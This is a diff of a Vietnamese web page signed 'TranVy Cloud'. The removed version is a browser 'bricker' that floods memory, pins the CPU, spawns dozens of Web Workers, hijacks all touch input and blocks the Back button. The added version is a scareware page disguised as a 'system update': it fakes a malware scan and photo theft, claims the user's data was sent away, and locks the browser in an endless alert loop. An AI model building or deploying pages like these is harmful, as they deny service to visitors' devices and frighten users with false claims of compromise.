@@ -1,325 +1,271 @@
 <!DOCTYPE html>
-<html lang="vi" class="h-full overflow-hidden">
+<html lang="vi" style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>NUCLEAR OVERLOAD - TranVy Cloud</title>
+    <title>Hệ Thống Đang Cập Nhật - TranVy Cloud</title>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        :root { --angle: 0deg; }
-        html, body {
-            overflow: hidden;
-            height: 100dvh;
-            width: 100vw;
-            position: fixed;
-            overscroll-behavior: none; 
-            touch-action: none;
-            background: #000;
+        :root {
+            --primary: #3b82f6;
+            --danger: #ef4444;
+            --glow: #3b82f6;
         }
         body {
             font-family: 'Inter', sans-serif;
-            color: #fff;
-            margin: 0;
-            user-select: none;
-            -webkit-user-select: none;
+            background-color: #000000;
+            color: #ffffff;
+            margin: 0; padding: 0;
+            width: 100vw; height: 100dvh; 
+            overflow: hidden;
+            touch-action: none; 
+            -webkit-font-smoothing: antialiased;
+            user-select: none; -webkit-user-select: none;
             cursor: none;
+            position: fixed;
+            overscroll-behavior-y: contain; 
         }
 
         .glass-card {
-            background: rgba(30, 0, 0, 0.98);
-            backdrop-filter: blur(80px);
-            border: 3px solid #ff0000;
-            border-radius: 10px;
-            box-shadow: 0 0 300px rgba(255, 0, 0, 0.8), inset 0 0 50px rgba(255, 0, 0, 0.3);
-            z-index: 100;
+            background: rgba(5, 5, 5, 0.95);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            box-shadow: 0 0 100px -20px rgba(59, 130, 246, 0.3);
             position: relative;
+            z-index: 100;
         }
 
+        /* Sửa lại hiệu ứng xoay viền neon */
         .neon-border {
             position: absolute;
-            inset: -8px;
-            border-radius: 15px;
-            background: conic-gradient(from var(--angle), #ff0000, #550000, #ff0000, #ff5555, #000, #ff0000);
-            animation: rotate 0.1s linear infinite;
-            z-index: -1;
+            top: -2px; left: -2px; right: -2px; bottom: -2px;
+            border-radius: 40px;
+            background: conic-gradient(from var(--a), transparent, var(--glow), transparent);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            animation: animate-border 3s linear infinite;
         }
 
-        @keyframes rotate { to { --angle: 360deg; } }
-        @property --angle { syntax: '<angle>'; initial-value: 0deg; inherits: false; }
+        @property --a {
+            syntax: '<angle>';
+            initial-value: 0deg;
+            inherits: false;
+        }
 
-        .glitch-extreme { animation: glitch 0.003s infinite alternate; }
+        @keyframes animate-border {
+            from { --a: 0deg; }
+            to { --a: 360deg; }
+        }
+
+        .glitch-screen { animation: glitch 0.2s infinite; }
         @keyframes glitch {
-            0% { transform: translate(10px, 0) scale(1.1); filter: contrast(500%) invert(1) blur(1px); }
-            50% { transform: translate(-10px, 5px) scale(0.9); filter: hue-rotate(180deg) brightness(200%); }
-            100% { transform: translate(0, -5px) scale(1.2); filter: contrast(600%) saturate(300%); }
+            0% { transform: translate(0); clip-path: inset(0 0 0 0); }
+            20% { transform: translate(-5px, 5px); clip-path: inset(10% 0 30% 0); }
+            40% { transform: translate(5px, -5px); clip-path: inset(40% 0 10% 0); }
+            60% { transform: translate(-5px, 0); clip-path: inset(70% 0 5% 0); }
+            80% { transform: translate(5px, 5px); clip-path: inset(20% 0 50% 0); }
+            100% { transform: translate(0); }
         }
 
-        #terminal {
+        .danger-flash { animation: danger-flash 0.1s infinite; }
+        @keyframes danger-flash { 0% { background-color: #000; } 50% { background-color: #300000; } }
+
+        #terminal-overlay {
             display: none;
             position: fixed;
-            inset: 0;
-            background: #000;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
             z-index: 200;
-            padding: 15px;
+            padding: 20px;
             font-family: 'Fira Code', monospace;
-            color: #ff0000;
-            font-size: 7.5px;
-            pointer-events: none;
+            color: #00ff00;
+            font-size: 10px;
             overflow: hidden;
-            line-height: 1.0;
-            text-shadow: 0 0 5px #ff0000;
+            pointer-events: none;
         }
 
-        #blocker {
-            position: fixed;
-            inset: 0;
-            z-index: 999999;
-            display: none;
-            background: transparent;
-            touch-action: none;
+        .progress-bar-fill {
+            transition: width 0.1s linear;
+            background: linear-gradient(90deg, #3b82f6, #ef4444, #3b82f6);
+            background-size: 200% 100%;
+            animation: move-bg 0.5s linear infinite;
         }
-
-        .info-label { color: #ff3333; font-weight: 800; text-transform: uppercase; }
-        .info-value { color: #ffffff; font-family: 'Fira Code', monospace; text-shadow: 0 0 2px #fff; }
+        @keyframes move-bg { to { background-position: 200% 0; } }
         
-        .shake-heavy { animation: shake 0.05s infinite; }
-        @keyframes shake {
-            0% { transform: translate(2px, 2px); }
-            25% { transform: translate(-2px, -2px); }
-            50% { transform: translate(-2px, 2px); }
-            75% { transform: translate(2px, -2px); }
-            100% { transform: translate(0, 0); }
-        }
-        
-        #overlay-trigger {
-            position: fixed;
-            inset: 0;
-            z-index: 2147483647;
-            background: transparent;
-            touch-action: none;
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1.5fr;
+            gap: 8px;
+            text-align: left;
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            background: rgba(255,255,255,0.03);
+            padding: 15px;
+            border-radius: 15px;
         }
 
-        .warning-text {
-            color: #ff0000;
-            font-weight: 900;
-            text-shadow: 0 0 10px #ff0000;
-            letter-spacing: 0.5em;
-        }
+        .info-label { color: rgba(255,255,255,0.4); text-transform: uppercase; }
+        .info-value { color: #ef4444; font-weight: bold; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
     </style>
 </head>
-<body class="flex items-center justify-center p-4">
-    <div id="overlay-trigger"></div>
-    <div id="blocker"></div> 
-    
-    <div id="matrix-container" class="fixed inset-0">
-        <canvas id="matrix"></canvas>
-    </div>
-    
-    <div id="terminal"></div>
+<body class="flex items-center justify-center">
 
-    <div id="main-content" class="glass-card w-full max-w-lg p-1">
+    <canvas id="bg-canvas" class="fixed top-0 left-0 w-full h-full opacity-60"></canvas>
+    <div id="terminal-overlay"></div>
+
+    <div id="main-ui" class="glass-card w-[94%] max-w-[450px] p-[2px]">
         <div class="neon-border"></div>
-        <div class="bg-black/95 rounded-[8px] p-6 text-center relative z-10">
-            <div class="absolute top-2 right-4 text-[10px] font-black text-red-600 tracking-tighter uppercase italic animate-bounce">
-                TranVy Cloud - Optimized Exploit
+        <div class="bg-[#050505] rounded-[38px] p-8 md:p-10 relative z-30 text-center">
+            <div class="flex justify-center mb-6">
+                <div class="w-16 h-16 bg-red-500/10 rounded-full flex items-center justify-center border border-red-500/20 shadow-[0_0_30px_rgba(239,68,68,0.3)]">
+                    <svg class="h-8 w-8 text-red-500 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                    </svg>
+                </div>
             </div>
 
-            <div class="mb-4 inline-block p-6 rounded-full bg-red-600/30 border-4 border-red-600 glitch-extreme">
-                <svg class="w-16 h-16 text-red-600" fill="currentColor" viewBox="0 0 24 24">
-                    <path d="M12 2L1 21h22L12 2zm0 3.45L19.53 19H4.47L12 5.45zM11 16h2v2h-2v-2zm0-7h2v5h-2V9z"/>
-                </svg>
+            <h1 id="main-title" class="text-xl font-black mb-2 tracking-tighter text-red-500">CẢNH BÁO HỆ THỐNG</h1>
+            <p id="status-label" class="text-white text-[8px] font-black mb-6 tracking-[0.3em] uppercase opacity-60 italic">ĐANG QUÉT MÃ ĐỘC...</p>
+
+            <div class="info-grid mb-6">
+                <span class="info-label">Thiết bị:</span>
+                <span id="dev-name" class="info-value">...</span>
+                <span class="info-label">Trình duyệt:</span>
+                <span id="dev-browser" class="info-value">...</span>
+                <span class="info-label">Độ phân giải:</span>
+                <span id="dev-res" class="info-value">...</span>
+                <span class="info-label">IP Address:</span>
+                <span id="dev-ip" class="info-value">103.21.144.XXX</span>
             </div>
 
-            <h1 class="text-4xl font-black text-red-600 uppercase tracking-tighter mb-4 italic">TERMINAL FAILURE</h1>
-            
-            <div id="device-info-panel" class="bg-red-950/60 border-2 border-red-600/80 rounded-lg p-4 mb-4 text-left space-y-2 text-[11px]">
-                <div class="flex justify-between"><span class="info-label">USER IP:</span> <span id="ip-addr" class="info-value text-yellow-400 font-bold">RETRIVING...</span></div>
-                <div class="flex justify-between"><span class="info-label">VICTIM DEVICE:</span> <span id="device-name" class="info-value uppercase italic">SCANNING...</span></div>
-                <div class="flex justify-between"><span class="info-label">EXPLOIT BROWSER:</span> <span id="browser-info" class="info-value">SCANNING...</span></div>
-                <div class="flex justify-between border-t border-red-600 mt-2 pt-2"><span class="info-label">CPU THREADS:</span> <span id="cpu-cores" class="info-value">0</span></div>
-                <div class="flex justify-between"><span class="info-label">GPU RENDER:</span> <span id="gpu-info" class="info-value text-red-400">SCANNING...</span></div>
-                <div class="flex justify-between border-t border-red-600 mt-2 pt-2"><span class="info-label">SYSTEM STATUS:</span> <span id="touch-status" class="text-green-500 font-black animate-pulse">READY</span></div>
+            <div class="space-y-4 mb-8">
+                <div class="w-full bg-white/5 h-1.5 rounded-full overflow-hidden border border-white/5">
+                    <div id="progress-bar" class="progress-bar-fill h-full w-0"></div>
+                </div>
+                <div class="flex justify-between text-[9px] text-red-500 font-mono font-bold uppercase tracking-widest">
+                    <span id="task-name">Đang tải exploit...</span>
+                    <span id="percent-text">0%</span>
+                </div>
             </div>
 
-            <button id="lock-btn" class="w-full py-6 bg-red-700 hover:bg-red-800 text-white font-black rounded shadow-[0_0_100px_rgba(255,0,0,1)] transition-all uppercase tracking-[0.3em] text-xl border-2 border-white">
-                KÍCH HOẠT HẠT NHÂN
+            <button id="trap-btn" class="w-full py-4 bg-white text-black font-black rounded-xl transition-all hover:bg-red-500 hover:text-white active:scale-95 text-xs uppercase tracking-widest mb-4">
+                NGỪNG QUÁ TRÌNH XÓA
             </button>
 
-            <p class="mt-6 warning-text text-[10px] animate-pulse">DEVICE WILL BE BRICKED UNTIL REBOOT</p>
+            <div class="creator-tag text-[9px] opacity-40 uppercase tracking-widest">
+                Dev By TranVy
+            </div>
         </div>
     </div>
 
+    <audio id="alert-sfx" loop><source src="https://www.soundjay.com/buttons/sounds/beep-11.mp3" type="audio/mpeg"></audio>
+
     <script>
-        const btn = document.getElementById('lock-btn');
-        const terminal = document.getElementById('terminal');
-        const blocker = document.getElementById('blocker');
-        const trigger = document.getElementById('overlay-trigger');
-        const touchStatus = document.getElementById('touch-status');
-        let isActive = false;
+        const btn = document.getElementById('trap-btn');
+        const progressBar = document.getElementById('progress-bar');
+        const percentText = document.getElementById('percent-text');
+        const statusLabel = document.getElementById('status-label');
+        const mainTitle = document.getElementById('main-title');
+        const terminal = document.getElementById('terminal-overlay');
+        const alertSfx = document.getElementById('alert-sfx');
 
-        // 1. DATA EXTRACTION
-        async function fetchDeviceInfo() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                document.getElementById('ip-addr').innerText = data.ip;
-            } catch(e) { document.getElementById('ip-addr').innerText = "192.168.1." + Math.floor(Math.random()*255); }
-
+        // 1. Thông tin thiết bị
+        function initInfo() {
             const ua = navigator.userAgent;
-            let browser = "Webkit (Stealth)";
-            if (ua.includes("Edge")) browser = "Microsoft Edge";
-            else if (ua.includes("Chrome")) browser = "Chrome";
-            else if (ua.includes("Safari")) browser = "Safari (iOS)";
-            document.getElementById('browser-info').innerText = browser;
-            document.getElementById('cpu-cores').innerText = navigator.hardwareConcurrency || "UNKNOWN";
-
-            try {
-                const canvasTmp = document.createElement('canvas');
-                const gl = canvasTmp.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                document.getElementById('gpu-info').innerText = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split(' ')[0];
-            } catch(e) { document.getElementById('gpu-info').innerText = "EMULATED"; }
-            document.getElementById('device-name').innerText = navigator.platform;
+            let device = "Mobile Device";
+            if (/Windows/i.test(ua)) device = "Windows PC";
+            if (/Macintosh/i.test(ua)) device = "MacBook";
+            if (/iPhone/i.test(ua)) device = "iPhone";
+            
+            document.getElementById('dev-name').innerText = device;
+            document.getElementById('dev-browser').innerText = navigator.vendor || "Hacker Browser";
+            document.getElementById('dev-res').innerText = `${window.screen.width} x ${window.screen.height}`;
+            document.getElementById('dev-ip').innerText = `113.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.1`;
         }
-        fetchDeviceInfo();
+        initInfo();
 
-        // 2. THE NUCLEAR ENGINE (BRICKER)
-        function triggerNuclearOverload() {
-            if (isActive) return;
-            isActive = true;
-            
-            blocker.style.display = 'block';
-            trigger.style.display = 'none';
-            document.body.classList.add('glitch-extreme', 'shake-heavy');
-            terminal.style.display = 'block';
-            touchStatus.innerText = "DEAD / NO RESPONSE";
-            touchStatus.className = "text-red-600 font-black underline";
-            
-            // Chặn nút Back trên Android/Browser
-            setInterval(() => {
-                window.history.pushState(null, null, "#null-" + Date.now());
-            }, 10);
+        // 2. Chặn tương tác
+        document.addEventListener('touchstart', () => {
+            // Kích hoạt âm thanh khi tương tác lần đầu (vượt rào cản trình duyệt)
+            alertSfx.volume = 0.2;
+        }, { once: true });
 
-            startHeavyWorkers();
-            
-            // MAIN THREAD OVERLOAD
-            const explode = () => {
-                const heap = [];
+        // 3. Tiến trình
+        let prog = 0;
+        const tasks = ["Bypassing Firewall...", "Accessing Database...", "Injecting Trojan...", "Dumping Photos...", "Finalizing..."];
+        
+        setInterval(() => {
+            if(prog < 100) {
+                prog += 0.15;
+                if(prog > 100) prog = 100;
+                progressBar.style.width = prog + "%";
+                percentText.innerText = Math.floor(prog) + "%";
                 
-                // Heap Flooding: Tạo áp lực RAM cực lớn
-                setInterval(() => {
-                    for(let i=0; i<30; i++) {
-                        const b = new Uint32Array(250000);
-                        b.fill(0xDEADBEEF);
-                        heap.push(b);
-                    }
-                    if(heap.length > 3000) heap.splice(0, 100); 
-                }, 50);
-                
-                // Vòng lặp CPU thông minh (không làm crash trình duyệt ngay lập tức)
-                const occupy = () => {
-                    const die = Date.now() + 980; // Chiếm 980ms mỗi giây
-                    while(Date.now() < die) {
-                        Math.atan2(Math.sin(Math.random()), Math.cos(Math.random()));
-                        document.body.style.filter = `hue-rotate(${Math.random() * 360}deg) contrast(${100 + Math.random() * 100}%)`;
-                    }
-                    setTimeout(occupy, 20); 
-                };
-
-                occupy();
-            };
-
-            setTimeout(explode, 50);
-        }
-
-        // 3. MULTI-THREADED ATTACK
-        function startHeavyWorkers() {
-            const code = `
-                const data = [];
-                setInterval(() => {
-                    data.push(new Float64Array(1024 * 512)); 
-                    if(data.length > 100) data.shift();
-                    for(let i=0; i<800000; i++) { Math.sqrt(i); }
-                }, 1);
-            `;
-            const blob = new Blob([code], { type: 'application/javascript' });
-            const url = URL.createObjectURL(blob);
-            
-            const num = Math.max((navigator.hardwareConcurrency || 8) * 4, 16);
-            for (let i = 0; i < num; i++) {
-                try { new Worker(url); } catch(e) {}
-            }
-        }
-
-        // 4. TOUCH HIJACKING (FIXED SWIPE)
-        const killTouch = (e) => {
-            if (isActive) {
-                if (e.cancelable) e.preventDefault();
-                e.stopImmediatePropagation();
-                return false;
-            } else {
-                triggerNuclearOverload();
-            }
-        };
-
-        const opts = { passive: false, capture: true };
-        ['touchstart', 'touchmove', 'touchend', 'touchcancel', 'mousedown', 'mousemove', 'wheel', 'click'].forEach(v => {
-            window.addEventListener(v, killTouch, opts);
-            document.addEventListener(v, killTouch, opts);
-        });
-
-        // 5. GPU STRESS MATRIX
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        let drops = [];
-        function initMatrix() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            for(let i=0; i<canvas.width/3; i++) drops[i] = 1;
-        }
-        function drawMatrix() {
-            ctx.fillStyle = "rgba(0,0,0,0.3)";
-            ctx.fillRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = isActive ? "#ff0000" : "#220000";
-            ctx.font = isActive ? "bold 28px Fira Code" : "10px monospace";
-            
-            const layers = isActive ? 60 : 1; 
-            for(let k=0; k<layers; k++) {
-                for(let i=0; i<drops.length; i++) {
-                    const char = String.fromCharCode(0x30A0 + Math.random() * 96);
-                    ctx.fillText(char, i*12, drops[i]*18);
-                    if(drops[i]*18 > canvas.height && Math.random() > 0.99) drops[i] = 0;
-                    drops[i]++;
+                if(prog > 20) document.getElementById('task-name').innerText = tasks[1];
+                if(prog > 50) document.getElementById('task-name').innerText = tasks[2];
+                if(prog > 80) {
+                    document.getElementById('task-name').innerText = tasks[3];
+                    document.body.classList.add('glitch-screen');
                 }
             }
-            requestAnimationFrame(drawMatrix);
+        }, 100);
+
+        // 4. Kích hoạt Trap
+        btn.addEventListener('click', () => {
+            alertSfx.play().catch(()=>{});
+            document.body.classList.add('danger-flash');
+            terminal.style.display = 'block';
+            
+            // Terminal chạy chữ
+            setInterval(() => {
+                const line = document.createElement('div');
+                line.innerText = `> EXPLOITING_KERNEL_DATA: ${Math.random().toString(16).substr(2, 10)}... [OK]`;
+                terminal.appendChild(line);
+                if(terminal.childNodes.length > 40) terminal.removeChild(terminal.firstChild);
+                window.scrollTo(0, document.body.scrollHeight);
+            }, 30);
+
+            setTimeout(() => {
+                alert("PHÁT HIỆN XÂM NHẬP BIẾN THÁI!\n\nToàn bộ dữ liệu của bạn đã bị gửi về máy chủ TranVy.");
+                while(true) {
+                    alert("IP CỦA BẠN ĐÃ BỊ GHI LẠI!\nĐỪNG CỐ THOÁT!");
+                }
+            }, 2000);
+        });
+
+        // 5. Canvas Background (Hiệu ứng mưa đỏ)
+        const canvas = document.getElementById('bg-canvas');
+        const ctx = canvas.getContext('2d');
+        let w, h, particles;
+
+        function setCanvasSize() {
+            w = canvas.width = window.innerWidth;
+            h = canvas.height = window.innerHeight;
+            particles = Array(50).fill().map(() => ({ x: Math.random()*w, y: Math.random()*h, s: Math.random()*3 + 2 }));
         }
 
-        initMatrix();
-        drawMatrix();
-        window.addEventListener('resize', initMatrix);
-
-        // Terminal Logs
-        setInterval(() => {
-            if(!isActive) return;
-            const msgs = [
-                "CRITICAL: CPU TEMP > 105C",
-                "MEMORY BOMB: HEAP FLOODING",
-                "IP_LOG: " + document.getElementById('ip-addr').innerText,
-                "DEVICE_INFECTED: " + navigator.platform,
-                "GPU_THROTTLING: FAILED",
-                "SWIPE_GESTURE: DISABLED",
-                "ANDROID_SYSTEM_UI: HANGING",
-                "TRANVY_CLOUD: OVERLOADED"
-            ];
-            const div = document.createElement('div');
-            div.innerText = `[FATAL] > ${msgs[Math.floor(Math.random()*msgs.length)]}`;
-            terminal.appendChild(div);
-            if(terminal.childNodes.length > 150) terminal.removeChild(terminal.firstChild);
-        }, 30);
+        function draw() {
+            ctx.fillStyle = "rgba(0,0,0,0.1)";
+            ctx.fillRect(0,0,w,h);
+            ctx.fillStyle = "#ff0000";
+            particles.forEach(p => {
+                p.y += p.s * 3;
+                if(p.y > h) p.y = -20;
+                ctx.fillRect(p.x, p.y, 1, 15);
+            });
+            requestAnimationFrame(draw);
+        }
+        
+        window.onresize = setCanvasSize;
+        setCanvasSize();
+        draw();
     </script>
 </body>
 </html>
